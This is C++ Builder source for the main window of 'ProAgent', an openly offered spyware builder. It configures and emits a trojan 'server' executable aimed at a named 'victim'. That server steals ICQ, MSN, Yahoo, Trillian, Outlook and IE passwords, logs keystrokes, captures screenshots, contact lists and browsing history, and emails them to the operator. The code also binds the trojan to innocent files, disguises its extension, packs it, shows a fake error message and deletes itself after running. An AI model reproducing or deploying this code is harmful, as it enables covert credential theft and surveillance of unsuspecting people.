/*===================================
ProAgent coded By ATmaCA
http://www.atmacasoft.com
atmaca@prohack.net
===================================*/
//---------------------------------------------------------------------------

#include <vcl.h>
#include "Registry.hpp"
#include <tlhelp32.h>
#include "wininet.h"
#include "Stdio.h"
#include "Editle.h"
#include "ikon.h"
#include "join.h"
#pragma hdrstop

#include "Unit1.h"
#include "Fake_Message.h"
#include "Unit2.h"
#include "Unit4.h"
#include "Unit5.h"
#include "Unit6.h"
#include "Unit7.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma link "SUIButton"
#pragma link "SUIComboBox"
#pragma link "SUIEdit"
#pragma link "SUIForm"
#pragma link "SUIGroupBox"
#pragma link "SUIImagePanel"
#pragma link "SUIRadioGroup"
#pragma link "SUIDlg"
#pragma link "SUIMemo"
#pragma link "ipwCore"
#pragma link "ipwmx"
#pragma link "SUIPopupMenu"
#pragma link "ipwsmtp"
#pragma resource "*.dfm"
#pragma resource "Resource\\Server.res"
#pragma resource "Resource\\upx.RES"
#pragma resource "Resource\\join.RES"
#pragma resource "Resource\\exe2vbs.RES"
#pragma comment(lib, "wininet.lib")
TForm1 *Form1;
TResourceStream *rc1 =new TResourceStream(0,"Server","exefile");
TResourceStream *rc2 =new TResourceStream(0,"UPX","exefile");
TResourceStream *rc3 =new TResourceStream(0,"Join","dllfile");
TResourceStream *rc4 =new TResourceStream(0,"exe2vbs","dllfile");

AnsiString Server;
AnsiString icon;
AnsiString icon2;
AnsiString Join;
AnsiString UPX;
AnsiString exe2vbs;
char uzanti1[4];
char uzanti2[4];
AnsiString as,as1;
DWORD dwFlags;
char Temp[128];

AnsiString Abook_atm,Adet_atm,cached_atm,Eudora_atm,Ftp_atm,KeyLog_atm,Kurban_atm,MailTo_atm,Mirabilis2003a_atm,
           Mirabilis98_atm,Miranda_atm,MsnMessenger_atm,Outlook_atm,PcInfo_atm,Processes_atm,Ras_atm,Smtp_atm,
           Ss_atm,Trillian_atm,UrlInfo_atm,Yahoo_atm,kSil_atm,hatamesaj_atm,hatabaslik_atm,hataicon_atm,hatabuton_atm,hatakont_atm;

bool kill(AnsiString exe_ismi)
{
                HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if(hSnapShot == INVALID_HANDLE_VALUE)
		{
                return false;
		}
		PROCESSENTRY32 procentry;
		HANDLE pr;
		procentry.dwSize = sizeof(PROCESSENTRY32);
		BOOL F = Process32First( hSnapShot, &procentry );

		while (F)
		{
                //ShowMessage(LowerCase(ExtractFileName(exe_ismi))+" "+LowerCase(ExtractFileName(procentry.szExeFile)));
                if(LowerCase(ExtractFileName(procentry.szExeFile))==LowerCase(ExtractFileName(exe_ismi)))

                {
		pr=OpenProcess(PROCESS_ALL_ACCESS,FALSE,procentry.th32ProcessID );
		if(pr!=NULL)
                TerminateProcess(pr,0);
                }
		//Memo1->Lines->Add( procentry.szExeFile );
		procentry.dwSize = sizeof(PROCESSENTRY32);
		F = Process32Next( hSnapShot, &procentry );
                }
	        CloseHandle(hSnapShot);
}
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
        : TForm(Owner)
{
}
//---------------------------------------------------------------------------

void __fastcall TForm1::FormCreate(TObject *Sender)
{

  //=============================================== //burada zip icinden calistirilip calistirilmadigi kontrol ediliyor
  AnsiString cs;
  char shortname[256];
  cs=ExtractFilePath(Application->ExeName);
  GetShortPathName(cs.c_str(),shortname,256);
  char tp[128];
  GetTempPath(128, tp);
  //ShowMessage(tp);
  //ShowMessage(shortname);
  if(strstr(shortname,tp))
     {
       suiMessageDialog1->Text="You can't run ProAgent directly from zip arhive.\nFirs extract!";
       suiMessageDialog1->IconType=suiStop;
       suiMessageDialog1->ShowModal();
       exit(1);
     }
  //=============================================== 

binded_file="";
TRegistry& reg = *new TRegistry();
reg.RootKey=HKEY_CURRENT_USER;
reg.OpenKey("\\SOFTWARE\\AtmacaSoft\\ProAgent",true);
reg.WriteString("Version","V1.2");
if(reg.ReadString("ICQ99")=="No")
suiCheckBox1->Checked=false;
if(reg.ReadString("ICQ2003")=="No")
suiCheckBox2->Checked=false;
if(reg.ReadString("Miranda")=="No")
suiCheckBox3->Checked=false;
if(reg.ReadString("Trillian")=="No")
suiCheckBox7->Checked=false;
if(reg.ReadString("Outlook")=="No")
suiCheckBox4->Checked=false;
if(reg.ReadString("IEProtected_Storage")=="No")
suiCheckBox10->Checked=false;
if(reg.ReadString("MSN")=="No")
suiCheckBox5->Checked=false;
if(reg.ReadString("Yahoo!")=="No")
suiCheckBox6->Checked=false;
if(reg.ReadString("Cached")=="No")
suiCheckBox8->Checked=false;
if(reg.ReadString("Ras")=="No")
suiCheckBox9->Checked=false;
if(reg.ReadString("KeyLog")=="No")
suiCheckBox11->Checked=false;
if(reg.ReadString("SysInfo")=="No")
suiCheckBox12->Checked=false;
if(reg.ReadString("UrlInfo")=="No")
suiCheckBox14->Checked=false;
if(reg.ReadString("Ss")=="No")
suiCheckBox16->Checked=false;
if(reg.ReadString("Processes")=="No")
suiCheckBox15->Checked=false;
if(reg.ReadString("ABook")=="No")
suiCheckBox13->Checked=false;
if(reg.ReadString("SelfDelete")=="No")
suiCheckBox17->Checked=false;
if(reg.ReadString("Pack")=="No")
suiCheckBox18->Checked=false;
if(reg.ReadString("FakeMessage")=="Yes")
suiCheckBox20->Checked=true;

if(reg.ReadString("Extension")=="exe")
suiRadioButton1->Checked=true;
if(reg.ReadString("Extension")=="scr")
suiRadioButton2->Checked=true;
if(reg.ReadString("Extension")=="com")
suiRadioButton3->Checked=true;
if(reg.ReadString("Extension")=="bat")
suiRadioButton4->Checked=true;
if(reg.ReadString("Extension")=="pif")
suiRadioButton5->Checked=true;
/*if(reg.ReadString("Extension")=="vbs")
suiRadioButton6->Checked=true;
if(reg.ReadString("Extension")=="htm")
suiRadioButton7->Checked=true; */

if(reg.ReadString("E-Mail")!="")
suiEdit1->Text=reg.ReadString("E-Mail");
if(reg.ReadString("Smtp")!="")
suiEdit2->Text=reg.ReadString("Smtp");
if(reg.ReadString("Kurban")!="")
suiEdit3->Text=reg.ReadString("Kurban");
suiComboBox1->ItemIndex=3;
suiComboBox2->ItemIndex=3;
}
//---------------------------------------------------------------------------
void __fastcall TForm1::FormClose(TObject *Sender, TCloseAction &Action)
{
TRegistry& reg = *new TRegistry();
reg.RootKey=HKEY_CURRENT_USER;
reg.OpenKey("\\SOFTWARE\\AtmacaSoft\\ProAgent",true);
if(suiCheckBox1->Checked==false)
reg.WriteString("ICQ99","No");
else
reg.WriteString("ICQ99","Yes");
if(suiCheckBox2->Checked==false)
reg.WriteString("ICQ2003","No");
else
reg.WriteString("ICQ2003","Yes");
if(suiCheckBox3->Checked==false)
reg.WriteString("Miranda","No");
else
reg.WriteString("Miranda","Yes");
if(suiCheckBox7->Checked==false)
reg.WriteString("Trillian","No");
else
reg.WriteString("Trillian","Yes");
if(suiCheckBox4->Checked==false)
reg.WriteString("Outlook","No");
else
reg.WriteString("Outlook","Yes");
if(suiCheckBox10->Checked==false)
reg.WriteString("IEProtected_Storage","No");
else
reg.WriteString("IEProtected_Storage","Yes");
if(suiCheckBox5->Checked==false)
reg.WriteString("MSN","No");
else
reg.WriteString("MSN","Yes");
if(suiCheckBox6->Checked==false)
reg.WriteString("Yahoo!","No");
else
reg.WriteString("Yahoo!","Yes");
if(suiCheckBox8->Checked==false)
reg.WriteString("Cached","No");
else
reg.WriteString("Cached","Yes");
if(suiCheckBox9->Checked==false)
reg.WriteString("Ras","No");
else
reg.WriteString("Ras","Yes");
if(suiCheckBox11->Checked==false)
reg.WriteString("KeyLog","No");
else
reg.WriteString("KeyLog","Yes");
if(suiCheckBox12->Checked==false)
reg.WriteString("SysInfo","No");
else
reg.WriteString("SysInfo","Yes");
if(suiCheckBox14->Checked==false)
reg.WriteString("UrlInfo","No");
else
reg.WriteString("UrlInfo","Yes");
if(suiCheckBox16->Checked==false)
reg.WriteString("Ss","No");
else
reg.WriteString("Ss","Yes");
if(suiCheckBox15->Checked==false)
reg.WriteString("Processes","No");
else
reg.WriteString("Processes","Yes");
if(suiCheckBox13->Checked==false)
reg.WriteString("ABook","No");
else
reg.WriteString("ABook","Yes");
if(suiCheckBox17->Checked==false)
reg.WriteString("SelfDelete","No");
else
reg.WriteString("SelfDelete","Yes");
if(suiCheckBox18->Checked==false)
reg.WriteString("Pack","No");
else
reg.WriteString("Pack","Yes");
if(suiCheckBox20->Checked==false)
reg.WriteString("FakeMessage","No");
else
reg.WriteString("FakeMessage","Yes");

if(suiEdit1->Text!="")
reg.WriteString("E-Mail",suiEdit1->Text);
if(suiEdit2->Text!="")
reg.WriteString("Smtp",suiEdit2->Text);
if(suiEdit2->Text!="")
reg.WriteString("Kurban",suiEdit3->Text);

if(suiRadioButton1->Checked==true)
reg.WriteString("Extension","exe");
if(suiRadioButton2->Checked==true)
reg.WriteString("Extension","scr");
if(suiRadioButton3->Checked==true)
reg.WriteString("Extension","com");
if(suiRadioButton4->Checked==true)
reg.WriteString("Extension","bat");
if(suiRadioButton5->Checked==true)
reg.WriteString("Extension","pif");
/*if(suiRadioButton6->Checked==true)
reg.WriteString("Extension","vbs");
if(suiRadioButton7->Checked==true)
reg.WriteString("Extension","htm");
exit(1);  **/
}
//---------------------------------------------------------------------------
void __fastcall TForm1::suiButton5Click(TObject *Sender)
{
Form3->ShowModal();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiButton3Click(TObject *Sender)
{
Form2->ShowModal();
}
//---------------------------------------------------------------------------



void __fastcall TForm1::suiCheckBox19Click(TObject *Sender)
{
if(suiCheckBox19->Checked==true)
suiComboBox2->Enabled=true;
else
suiComboBox2->Enabled=false;
}
//---------------------------------------------------------------------------





void __fastcall TForm1::suiButton9Click(TObject *Sender)
{
if(suiEdit1->Text=="")
{
suiMessageDialog1->Text="You didn't specified an E-Mail adress.";
suiMessageDialog1->IconType=suiStop;
suiMessageDialog1->ShowModal();
return;
}
if(suiEdit2->Text=="")
{
suiMessageDialog1->Text="You didn't specified the SMTP Server.";
suiMessageDialog1->IconType=suiStop;
suiMessageDialog1->ShowModal();
return;
}
if(suiEdit3->Text=="")
{
suiMessageDialog1->Text="You didn't specified the Victim Name.";
suiMessageDialog1->IconType=suiStop;
suiMessageDialog1->ShowModal();
return;
}


if(suiRadioButton1->Checked==true)
strcpy(uzanti1,"exe");
if(suiRadioButton2->Checked==true)
strcpy(uzanti1,"scr");
if(suiRadioButton3->Checked==true)
strcpy(uzanti1,"com");
if(suiRadioButton4->Checked==true)
strcpy(uzanti1,"bat");
if(suiRadioButton5->Checked==true)
strcpy(uzanti1,"pif");


GetTempPath(128, Temp);
Server=ExtractFilePath(Application->ExeName)+"server.exe";
icon=AnsiString(Temp)+"Icon.ico";
icon2=AnsiString(Temp)+"Icon2.ico";
UPX=AnsiString(Temp)+"upx.exe";
Join=ExtractFilePath(Application->ExeName)+"binded_server.exe";
try
{
rc1->SaveToFile(Server);
}
catch(...)
{
suiMessageDialog1->Text="Can't Create Server.";
suiMessageDialog1->IconType=suiStop;
suiMessageDialog1->ShowModal();
return;
}

if(!FileExists(UPX))
rc2->SaveToFile(UPX);
Image1->Picture->Icon->SaveToFile(icon2);
Form2->Image74->Picture->Icon->SaveToFile(icon);

if(binded_file!="")
{
  if(Change_Icon(icon,Server)==false)   //sabit icon kullaniliyor
   {
      suiMessageDialog1->Text="Can't Change Icon.";
      suiMessageDialog1->IconType=suiStop;
      suiMessageDialog1->ShowModal();
      DeleteFile(Server);

      return;
    }
}
 else             //icon imzasini degistirdiginde bu kismi dahil edebilirsin unutma!!
     {
       if(Change_Icon(icon2,Server)==false)  //secilen icon kullaniliyor
          {
           suiMessageDialog1->Text="Can't Change Icon.";
           suiMessageDialog1->IconType=suiStop;
           suiMessageDialog1->ShowModal();
           DeleteFile(Server);

           return;
          }
     }
/*if(Change_Icon(icon2,Server)==false)  //secilen icon kullaniliyor
          {
           suiMessageDialog1->Text="Can't Change Icon.";
           suiMessageDialog1->IconType=suiStop;
           suiMessageDialog1->ShowModal();
          }   */
//===========================================================

if(suiCheckBox17->Checked)
kSil_atm="1";
else
kSil_atm="0";
if(suiCheckBox13->Checked)
Abook_atm="1";
else
Abook_atm="0";
if(suiCheckBox19->Checked)
{if(suiComboBox2->ItemIndex==0) Adet_atm="360000"; if(suiComboBox2->ItemIndex==1) Adet_atm="1800000"; if(suiComboBox2->ItemIndex==2) Adet_atm="3600000"; if(suiComboBox2->ItemIndex==3) Adet_atm="5400000"; if(suiComboBox2->ItemIndex==4) Adet_atm="7200000";}
else
Adet_atm="0";
if(suiCheckBox8->Checked)
cached_atm="1";
else
cached_atm="0";
if(suiCheckBox4->Checked)
Eudora_atm="1";
else
Eudora_atm="0";
if(suiCheckBox10->Checked)
Ftp_atm="1";
else
Ftp_atm="0";
if(suiCheckBox11->Checked)
KeyLog_atm="1";
else
KeyLog_atm="0";
Kurban_atm=suiEdit3->Text;
MailTo_atm=suiEdit1->Text;
if(suiCheckBox2->Checked)
Mirabilis2003a_atm="1";
else
Mirabilis2003a_atm="0";
if(suiCheckBox1->Checked)
Mirabilis98_atm="1";
else
Mirabilis98_atm="0";
if(suiCheckBox3->Checked)
Miranda_atm="1";
else
Miranda_atm="0";
if(suiCheckBox5->Checked)
MsnMessenger_atm="1";
else
MsnMessenger_atm="0";
if(suiCheckBox4->Checked)
Outlook_atm="1";
else
Outlook_atm="0";
if(suiCheckBox12->Checked)
PcInfo_atm="1";
else
PcInfo_atm="0";
if(suiCheckBox15->Checked)
Processes_atm="1";
else
Processes_atm="0";
if(suiCheckBox9->Checked)
Ras_atm="1";
else
Ras_atm="0";
Smtp_atm=suiEdit2->Text;
if(suiCheckBox16->Checked)
Ss_atm=(suiComboBox1->Items->Strings[suiComboBox1->ItemIndex]);
else
Ss_atm="0";
if(suiCheckBox7->Checked)
Trillian_atm="1";
else
Trillian_atm="0";
if(suiCheckBox14->Checked)
UrlInfo_atm="1";
else
UrlInfo_atm="0";
if(suiCheckBox6->Checked)
Yahoo_atm="1";
else
Yahoo_atm="0";

hatamesaj_atm=Form3->suiEdit2->Text;
hatabaslik_atm=Form3->suiEdit1->Text;
if(Form3->a==0) hataicon_atm="0";
if(Form3->a==MB_ICONSTOP) hataicon_atm="1";
if(Form3->a==MB_ICONQUESTION) hataicon_atm="2";
if(Form3->a==MB_ICONINFORMATION) hataicon_atm="3";
if(Form3->a==MB_ICONEXCLAMATION) hataicon_atm="4";

if(Form3->b==MB_OK) hatabuton_atm="1";
if(Form3->b==MB_OKCANCEL) hatabuton_atm="2";
if(Form3->b==MB_YESNO) hatabuton_atm="3";
if(Form3->b==MB_YESNOCANCEL) hatabuton_atm="4";
if(Form3->b==MB_RETRYCANCEL) hatabuton_atm="5";
if(Form3->b==MB_ABORTRETRYIGNORE) hatabuton_atm="6";

if(suiCheckBox20->Checked==true)
{
Editle(Server,"hatakont_atm=","1");
Editle(Server,"hatamesaj_atm=",hatabaslik_atm);  //tam tersi
Editle(Server,"hatabaslik_atm=",hatamesaj_atm); //tam tersi
Editle(Server,"hataicon_atm=",hataicon_atm);
Editle(Server,"hatabuton_atm=",hatabuton_atm);

}
else
Editle(Server,"hatakont_atm=","0");

//===========================================================
Editle(Server,"kSil_atm=",kSil_atm);
Editle(Server,"Abook_atm=",Abook_atm);
Editle(Server,"Adet_atm=",Adet_atm);
Editle(Server,"cached_atm=",cached_atm);
Editle(Server,"Eudora_atm=",Eudora_atm);
Editle(Server,"Ftp_atm=",Ftp_atm);
Editle(Server,"KeyLog_atm=",KeyLog_atm);
Editle(Server,"Kurban_atm=",Kurban_atm);
Editle(Server,"MailTo_atm=",MailTo_atm);
Editle(Server,"Mirabilis2003a_atm=",Mirabilis2003a_atm);
Editle(Server,"Mirabilis98_atm=",Mirabilis98_atm);
Editle(Server,"Miranda_atm=",Miranda_atm);
Editle(Server,"MsnMessenger_atm=",MsnMessenger_atm);
Editle(Server,"Outlook_atm=",Outlook_atm);
Editle(Server,"PcInfo_atm=",PcInfo_atm);
Editle(Server,"Processes_atm=",Processes_atm);
Editle(Server,"Ras_atm=",Ras_atm);
Editle(Server,"Smtp_atm=",Smtp_atm);
Editle(Server,"Ss_atm=",Ss_atm);
Editle(Server,"Trillian_atm=",Trillian_atm);
Editle(Server,"UrlInfo_atm=",UrlInfo_atm);
Editle(Server,"Yahoo_atm=",Yahoo_atm);
//=================================================== //Server burdan sonra unpack olmaya hazir hale geldi,.
//===================================================

if(suiCheckBox18->Checked) //UPX pack
  {
    AnsiString pUPX;
    char curdir[256];
    char shortname[256];
    strcpy(curdir,ExtractFilePath(Application->ExeName).c_str());
    int slength =GetShortPathName(curdir,shortname,256);
    AnsiString sServer=AnsiString(shortname)+"server.exe";
    pUPX=UPX+" "+sServer;
    WinExec(pUPX.c_str(),SW_HIDE);
    Sleep(8000); //Upx isleminin bitmesi bekleniyor ~8sn umarim yavas sistemlerdede 4sn zaman yatarli olur :)
  }

//=======================================================
//======================================================= Bind
if(binded_file!="")  /////////// join ediliyor...
    {

    /*if(uzanti_bul(binded_file)=="-1")
       {
         suiMessageDialog1->Text="Binded File Extension must be 3 caracter.\nExample (*.jpb,*.mp3,*.xxx";
         suiMessageDialog1->IconType=suiStop;
         suiMessageDialog1->ShowModal();
         MessageBox(0,"Birlestirilecek dosyanin uzantisi 3 haneli olmalidir!","ProAgent Hata:",MB_ICONSTOP | MB_OK);
         return;
       }   */
     //  else
       //    {


             try
             {
             rc3->SaveToFile(Join);
             }
             catch(...)
                       {
                         suiMessageDialog1->Text="Can't Create Binded_Server.";
                         suiMessageDialog1->IconType=suiStop;
                         suiMessageDialog1->ShowModal();
                         DeleteFile(Server);

                         return; //burda flaglari delete etmene gerek yok
                       }
             strcpy(uzanti2,uzanti_bul(binded_file).c_str());
             //ShowMessage(uzanti1);
             //ShowMessage(uzanti2);
             if(join(uzanti1,uzanti2,binded_file)!= true )
                {
                suiMessageDialog1->Text="Server Can't bind.";
                suiMessageDialog1->IconType=suiStop;
                suiMessageDialog1->ShowModal();
                DeleteFile(Server);
                DeleteFile(Join);

                return;
                }


                   if(Change_Icon(icon2,Join)==false)   //sabit icon kullaniliyor
                      {
                        suiMessageDialog1->Text="Can't Change Joined_Server Icon.";
                        suiMessageDialog1->IconType=suiStop;
                        suiMessageDialog1->ShowModal();
                        DeleteFile(Server);
                        DeleteFile(Join);
                        return;
                      }
                      //ShowMessage(Server);
                      DeleteFile(Server);


  as = ChangeFileExt(Join,"."+AnsiString(uzanti1));
  CopyFile(Join.c_str(),as.c_str(),false);
  if(strcmp(uzanti1,"exe"))
  DeleteFile(Join);
  DeleteFile(as1);
  suiMessageDialog1->Text="The binded_server has been created with your settings in the current directory and is ready for running.";
  suiMessageDialog1->IconType=suiInformation;
  suiMessageDialog1->ShowModal();
  }
  else
      {
        //ShowMessage("Uygulaniyor");
        as1 = ChangeFileExt(Server,"."+AnsiString(uzanti1));
        CopyFile(Server.c_str(),as1.c_str(),false);
        if(strcmp(uzanti1,"exe"))
        DeleteFile(Server);
        DeleteFile(as);
        DeleteFile(Join);
        suiMessageDialog1->Text="The server has been created with your settings in the current directory and is ready for running.";
        suiMessageDialog1->IconType=suiInformation;
        suiMessageDialog1->ShowModal();
      }

  
//======================================================= Bind
//---------------------------------------------------------------------------
}
void __fastcall TForm1::suiButton4Click(TObject *Sender)
{
if(suiButton4->Caption=="Bind With File")
 {
 if(!OpenDialog1->Execute())
 return;
 Form1->binded_file=OpenDialog1->FileName;
 if(uzanti_bul(binded_file)=="-1")
       {
         suiMessageDialog1->Text="Binded File Extension must be 3 caracter.\nExample (*.jpg,*.mp3,*.xxx)";
         suiMessageDialog1->IconType=suiStop;
         suiMessageDialog1->ShowModal();
         Form1->binded_file="";
         return;
       }

         Form1->binded_file=OpenDialog1->FileName;
         suiMessageDialog1->Text="Server will bind with "+ExtractFileName(binded_file)+ " Successful.";
         suiMessageDialog1->IconType=suiInformation;
         suiMessageDialog1->ShowModal();
         suiButton4->Caption="Remove Binded File";
         return;
 }
  else
       {
         Form1->binded_file="";
         suiMessageDialog1->Text="Binded file removed Successful.";
         suiMessageDialog1->IconType=suiInformation;
         suiMessageDialog1->ShowModal();
         suiButton4->Caption="Bind With File";
       }
}
//---------------------------------------------------------------------------




void __fastcall TForm1::suiCheckBox1MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Decrypt ICQ99b-2002a passwords.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox2MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Decrypt ICQ2003a/Lite passwords.";        
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox3MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Decrypt miranda-icq passwords.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox7MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Decrypt Trillian/Trillian PRO AIM/ICQ passwords.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox5MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Decrypt MSN Messenger passwords.";
}
//---------------------------------------------------------------------------




void __fastcall TForm1::suiCheckBox10MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Decrypt IE autocomplete (eg. passwords from hotmail.com web interface) & secure sites (when you enter on such site you've been asked for a pass) passwords.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox4MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Decrypt MS Outlook Express and Eudora passwords.";
}
//---------------------------------------------------------------------------



void __fastcall TForm1::suiCheckBox6MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Get crypted Yahoo! Messenger passwords.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox8MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Decrypt Cached passwords.(Only win9x and winMe)";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox9MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Ras-Dialup passwords.(Only win9x and winMe)";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox11MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="If Log pressed keys Checked,server will install offline keylogger on the target machine and will send log.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox12MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Get information about OS, memory, processor, hard drives, name of the logged user.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox14MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Get url history.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox16MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="If this option is checked,when the victim is online the server will reveal the victims desktop.Here you can set the quality of the captured images";        
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox17MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="If the 'Melt' options is checked, the server will delete itself after the first run.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox18MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Pack executable, reduces output size significantly.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox20MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="The Fake Error Message is also only for the first server run.";
}
//---------------------------------------------------------------------------


void __fastcall TForm1::suiCheckBox15MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Get All opened Processes log.";

}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox13MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Get Outlook and MSN Messenger contak list.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiButton1MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Test if SMTP server works properly.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiButton2MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Find SMTP server for the specific E-Mail.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiButton5MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Fake error message configuration.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiButton7MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="If you are accidentally infected with proagent server ,from here you can remove it.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiEdit1MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="E-Mail sddress which will receive message with passwords.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiEdit2MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="SMTP server for your e-mail.if you don't known how to obtain,press 'Resolve' button.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiEdit3MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Here you can give a nick name for your victim. This nick name will be shown to your mail notification to remind you of the victims identity.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Label4MouseMove(TObject *Sender, TShiftState Shift,
      int X, int Y)
{
suiMemo1->Text="in here you give a nick name for your victim.You can give anyname. This nick name will be shown you mail notification to remind.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Label1MouseMove(TObject *Sender, TShiftState Shift,
      int X, int Y)
{
suiMemo1->Text="E-Mail sddress which will receive message with passwords.";
        
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Label2MouseMove(TObject *Sender, TShiftState Shift,
      int X, int Y)
{
suiMemo1->Text="SMTP server for your e-mail.if you don't known how to obtain,press 'Resolve' button.";

}
//---------------------------------------------------------------------------



void __fastcall TForm1::suiButton4MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="You can bind server with a file.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiButton3MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="You can change server icon.(32x32x256)";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiButton1Click(TObject *Sender)
{
if(suiEdit1->Text=="")
{
suiMessageDialog1->Text="You didn't specified an E-Mail adress.";
suiMessageDialog1->IconType=suiStop;
suiMessageDialog1->ShowModal();
return;
}
if(suiEdit2->Text=="")
{
suiMessageDialog1->Text="You didn't specified the SMTP Server.";
suiMessageDialog1->IconType=suiStop;
suiMessageDialog1->ShowModal();
return;
}
if (!InternetGetConnectedState(&dwFlags, NULL))
      {
        suiMessageDialog1->Text="You must be connected to the internet.";
        suiMessageDialog1->IconType=suiStop;
        suiMessageDialog1->ShowModal();
        return;
      }
Form6->suiMemo1->Clear();
Form6->Show();
try    //devreye sokmayi untmaaaa
  {
if (Form1->NMSMTP1->Connected)
   Form1->NMSMTP1->Disconnect();
   Form1->NMSMTP1->MailServer=suiEdit2->Text;
   Form1->NMSMTP1->Connect();
   Form1->NMSMTP1->SendTo=suiEdit1->Text;
   Form1->NMSMTP1->Send();
   Form1->NMSMTP1->Disconnect();
   Form6->Close();
   suiMessageDialog2->Text="The message was successfully sent.";
   suiMessageDialog2->IconType=suiInformation;
   if(suiMessageDialog2->ShowModal()==2)
   Form6->Show();
   return;
   }
    catch(...)
    {
     Form6->Close();
     suiMessageDialog2->Text="Message can't be delivered.";
     suiMessageDialog2->IconType=suiStop;
     if(suiMessageDialog2->ShowModal()==2)
     Form6->Show();
     return;
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiButton2Click(TObject *Sender)
{
if(suiEdit1->Text=="")
{
suiMessageDialog1->Text="You didn't specified an E-Mail adress.";
suiMessageDialog1->IconType=suiStop;
suiMessageDialog1->ShowModal();
return;
}
if (!InternetGetConnectedState(&dwFlags, NULL))
      {
        suiMessageDialog1->Text="You must be connected to the internet.";
        suiMessageDialog1->IconType=suiStop;
        suiMessageDialog1->ShowModal();
        return;
      }
ipwMX1->DNSServer=Form7->suiEdit1->Text;
ipwMX1->EmailAddress=suiEdit1->Text;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ipwMX1Response(TObject *Sender, int RequestId,
      AnsiString &Domain, AnsiString &MailServer, int Precedence,
      long TimeToLive, int StatusCode, AnsiString &Description)
{
suiEdit2->Text=MailServer;
return;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiButton6Click(TObject *Sender)
{
Form4->Show();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiButton6MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Set's crypted keys to Yahoo registry.After setting the registry you will automatcly connect to the victims mail box.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiButton9MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Create a new server.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiCheckBox19MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="Interval(delay) in seconds between data sending retries.";
}
//---------------------------------------------------------------------------

